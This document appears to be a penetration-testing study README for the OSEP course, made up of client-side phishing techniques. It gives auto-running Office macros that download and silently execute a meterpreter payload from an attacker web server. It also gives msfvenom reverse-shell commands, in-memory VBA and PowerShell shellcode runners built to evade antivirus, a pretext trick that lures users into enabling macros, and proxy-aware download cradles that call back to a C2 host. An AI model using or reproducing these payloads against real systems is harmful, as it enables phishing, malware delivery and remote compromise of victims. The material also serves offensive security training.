# OSEP-Rebirth

## Table of Content

* 1.0 [Client Side - Phishing Attacks](#CSPhishing)
  * 1.1 [HTML Smuggling](#Smuggling)
  * 1.2 [VBA - Phishing](#VBAPhishing)
  * 1.3 [VBA - PreTexting](#VBAPreTexting)
  * 1.4 [VBA - VBA Shellcode Runner](#VBARunner)
  * 1.5 [Powershell - Shellcode Runner](#PSRunner)
  * 1.6 [PowerShell - Reflection Shellcode Runner](#PSReflection)
  * 1.7 [PowerShell - Bypass Proxy](#PSProxy)
* 2.0 [Client Side Code Execution With Windows Script Host](#CSWSH)

# Client Side - Phishing Attacks<a name="CSPhishing"></a>

## HTML Smuggling<a name="Smuggling"></a>

### JavaScript code to trigger HTML Smuggling

* This technique will download a meterpreter payload once the web page is loaded by the user. (may be blocked by smart screen or other protections)

Code can be found <a href="/Collections/1.0-Client_Side_Phishing_Attacks/1.1-HTML_Smuggling">here</a>

## VBA - Phishing<a name="VBAPhishing"></a>

* This techniques will run a macro (once user enable them), that will download on disk a meterpreter payload and execute it hidden from the user.
* Tested using Office 2016 Pro
* The document must be saved in a Macro-Enabled format such as ".doc" or ".docm". The newer ".docx" will not store macros.

VBA can be combined with PowerShell.

Here is how download a file in powershell.

```
$url = "http://192.168.1.22/msfstaged.exe"
$out = "msfstaged.exe"
$wc = New-Object Net.WebClient
$wc.DownloadFile($url, $out)
```

This can be done in One Liner too.

```
(New-Object System.Net.WebClient).DownloadFile('http://192.168.1.22/msfstaged.exe','msfstaged.exe')
```

Combining the piece with VBA. This macro will pull the meterpreter executable from our web server when the document is opened and macro are enabled. The delay is to allow the file to completely download. Finally the file is executed hidden from the user.

```
Sub Document_Open()
	MyMacro
End Sub

Sub AutoOpen()
	MyMacro
End Sub

Sub MyMacro()
	Dim str as String
	str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.22/msfstaged.exe','msfstaged.exe')"
	Shell str, vbHide
	Dim exePath As String
	exePath = ActiveDocument.Path + "\msfstaged.exe"
	Wait(2)
	Shell exePath, vbHide
End Sub

Sub Wait(n as Long)
	Dim t As Date
	t = Now
	Do
		DoEvents
	Loop Until Now >= DateAdd("s", n, t)
End Sub
```

## VBA - PreTexting<a name="VBAPreTexting"></a>

### The Old Switcheroo

* This technique is used to trick the user to press on the "Enable Editing" and "Enable Content" button to allow macro execution.

1. Create an "encrypted" word page content, something in the idea "This file is encrypted, please Enable Editing and Enable content to decrypt it".
2. Make a copy of this word document.
3. Delete the content, and create your "decrypted" content. If you'r target work in human resource, make a CV as example.
4. Once the content created, select it and navigate to "Insert > Quick Parts > AutoTexts" and "Save Selection to AutoText Gallery.
5. Pick a name for the AutoText gallery.
6. Now that the content is stored, delete the content in the main text area and replace it with the content of our "encrypted" word document.
7. Create the VBA macro to replace the "encrypted" content with the "decrypted" content.
```
Sub Document_Open()
	SubstitutePage
End Sub

Sub AutoOpen()
	SubstitutePage
End Sub

Sub SubstitutePage()
	ActiveDocument.Content.Select
	Selection.Delete
	ActiveDocument.AttachedTemplate.AutoTextEntries("<name of AutoText Gallery>").Insert Where:=Selection.Range, RichText:=True
End Sub
```

## VBA - VBA Shellcode Runner<a name="VBARunner"></a>

* This macro execute shellcode in memory by using Win32 APIs to avoid detection.
* Use the exit function "thread" while generating the payload to avoid word to close when the shellcode exit.
* If the victim close Word, our shell will die.

1. Generate a msf payload formatted as vbapplication.
```
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.22 LPORT=443 EXITFUNC=thread -f vbapplication
```

2. Create the macro adding your generated array payload to it.
```
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Function MyMacro()
	Dim buf As Variant
	Dim addr As LongPtr
	Dim counter As Long
	Dim data As Long
	Dim res As Long

	buf = <Array(msf payload)>

	addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)

	For counter = LBound(buf) To UBound(buf)
		data = buf(counter)
		res = RtlMoveMemory(addr + counter, data, 1)
	Next counter

	res = CreateThread(0, 0, addr, 0, 0, 0)
End Function

Sub Document_Open()
	MyMacro
End Sub

Sub AutoOpen()
	MyMacro
End Sub
```

## PowerShell - Shellcode Runner<a name="PSRunner"></a>

* This macro download a PowerShell script and run it into memory. Then it will launch the PowerShell script as child process to avoid losing our shell once the victime close Microsoft Word. 

1. Generate the shellcode in PowerShell format using msfvenom.
```
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.22 LPORT=443 EXITFUNC=thread -f ps1
```

2. Create "run.ps1" script.
```
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
	[DllImport("kernel32")]
	public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
	
	[DllImport("kernel32", CharSet=CharSet.Ansi)]
	public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

	[DllImport("kernel32.dll", SetLastError=true)]
	public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
}
"@

Add-Type $Kernel32

[Byte[]] $buf = <Generated msfvenom shellcode>

$size = $buf.Length

[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)

$thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);

[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
```

3. Create the VBA macro which will download the ps1 code in memory and execute it.
```
Sub MyMacro()
	Dim str As String
	str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.1.22/run.ps1') | IEX"
	Shell str, vbHide
End Sub

Sub Document_Open()
	MyMacro
End Sub

Sub AutoOpen()
	MyMacro
End Sub
```


## PowerShell - Reflection Shellcode Runner<a name="PSReflection"></a>

* This PowerShell script avoid creating artifacts on the hard drive that may be identified by Anti Virus.

1. Generate the shellcode in PowerShell format using msfvenom.
```
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.22 LPORT=443 EXITFUNC=thread -f ps1
```

2. Create "run.ps1" script.
```
function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
    Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,
    @($moduleName)), $functionName))
}

function getDelegateType {
    Param (
    [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
    [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('InMemoryModule', $false).
    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',
    [System.MulticastDelegate])
    $type.
    DefineConstructor('RTSpecialName, HideBySig, Public',
    [System.Reflection.CallingConventions]::Standard, $func).
    SetImplementationFlags('Runtime, Managed')
    $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
    SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}


$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), 
  (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[Byte[]] $buf = <msfvenom shellcode>
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread),
  (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr],[UInt32], [IntPtr])([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject),
  (getDelegateType @([IntPtr], [Int32])([Int]))).Invoke($hThread, 0xFFFFFFFF)
```

3. Create the VBA macro which will download the ps1 code in memory and execute it.
```
Sub MyMacro()
	Dim str As String
	str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.1.22/run.ps1') | IEX"
	Shell str, vbHide
End Sub

Sub Document_Open()
	MyMacro
End Sub

Sub AutoOpen()
	MyMacro
End Sub
```

## PowerShell - Bypass Proxy<a name="PSProxy"></a>

### Proxy-Aware Communication
* Bypass proxy server when downloading file with PowerShell, by nulling the proxy settings 
* Customize User-Agent

```
$wc = new-object system.net.WebClient
$wc.proxy = $null
$wc.Headers.Add('User-Agent', "This is my agent, there is no one like it...") 
$wc.DownloadString("http://192.168.119.22/run.ps1")
```

### SYSTEM integrity proxy-aware download cradle

* Handle communication through a proxy, even as SYSTEM.
* HTTP request is routed through the proxy server and will allow our download cradle to call back to our C2 even when all traffic must go through the proxy.

```
New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null
$keys = Get-ChildItem 'HKU:\'
ForEach ($key in $keys) {if ($key.Name -like "*S-1-5-21-*") {$start = $key.Name.substring(10);break}}
$proxyAddr=(Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer
[system.net.webrequest]::DefaultWebProxy = new-object
System.Net.WebProxyy("http://$proxyAddr")
$wc = new-object system.net.WebClient
$wc.DownloadString("http://192.168.1.22/run2.ps1")
```


# Client Side Code Execution With Windows Script Host<a name="CSWSH"></a>

